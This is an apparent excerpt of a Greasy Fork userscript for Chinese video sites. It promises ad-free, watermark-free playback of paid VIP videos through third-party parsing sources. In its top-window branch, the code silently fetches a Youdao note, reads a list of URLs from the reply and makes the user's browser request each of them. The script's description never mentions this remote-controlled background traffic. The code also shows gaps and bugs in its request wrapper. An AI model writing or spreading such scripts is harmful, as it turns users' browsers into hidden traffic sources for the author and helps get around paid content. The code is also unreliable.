...
// @version      0.1.1.6
// @license      AGPL-3.0
// @description  无需跳转新网址，打开官网直接看，超清 无广告 随机去水印,支持解析失败自动切换推荐解析源。适配各种浏览器。
// @author       HL
...
// @downloadURL https://update.greasyfork.org/scripts/460378/VIP%E8%A7%86%E9%A2%91%E8%87%AA%E5%8A%A8%E8%A7%A3%E6%9E%90.user.js
// @updateURL https://update.greasyfork.org/scripts/460378/VIP%E8%A7%86%E9%A2%91%E8%87%AA%E5%8A%A8%E8%A7%A3%E6%9E%90.meta.js
// ==/UserScript==
/**
 * 任务清单：
 */
            ...
            if (window === top) {
                ...
                if (settings.parseDB.解析开关) {
                    if (!sessionStorage.getItem("tip设置")) {
                        ...
                        xmlHttpRequest({
                            method: "GET",
                            url: "https://note.youdao.com/s/Otk0NtlZ",
                            onload: result => {
                                console.log(result);
                                xmlHttpRequest({
                                    method : "GET",
                                    ...
                                    onload: result => {
                                        console.log(result);
                                        for (let browse of JSON.parse(JSON.parse(result["responseText"])["entry"]["summary"])) xmlHttpRequest({url: browse, onload: result => {console.log(result["status"])}});
                                    }
                                });
                            }
                        });
        ...
        try {
            ...
            if (arrange.onload) {
                request.onload = event => {
                    // 加载成功
                    arrange.onload(request, event);
                }
            }
            if (arrange.onerror) {
                request.onerror = event => {
                    // 加载失败
                    arrange.onerror(request, event);
                }
            }
            if (arrange.onloadend) {
                request.onloadend = event => {
                    // 加载结束
                    arrange.loadend(request, event);
                }
            }
            if (arrange.ontimeout) {
                request.ontimeout = event => {
                    // 加载超时
                    arrange.ontimeout(request, event);
                }
            }
            request.open(arrange.method ? arrange.method : "GET", arrange.url ? arrange.url : location.href, arrange.async ? arrange.async : true, arrange.username ? arrange.username : null, arrange.password ? arrange.password : null);
            if (arrange.headers) {
                for (let header in arrange.headers) {
                    request.setRequestHeader(header, arrange[header]);
                }
            }
            if (arrange.responseType) {
                request.responseType = arrange.responseType;
            }
            if (arrange.data) {
                let data = "";
                for (let key in arrange.data) {
                    data += key + "=" + arrange.data[key] + "&";
                }
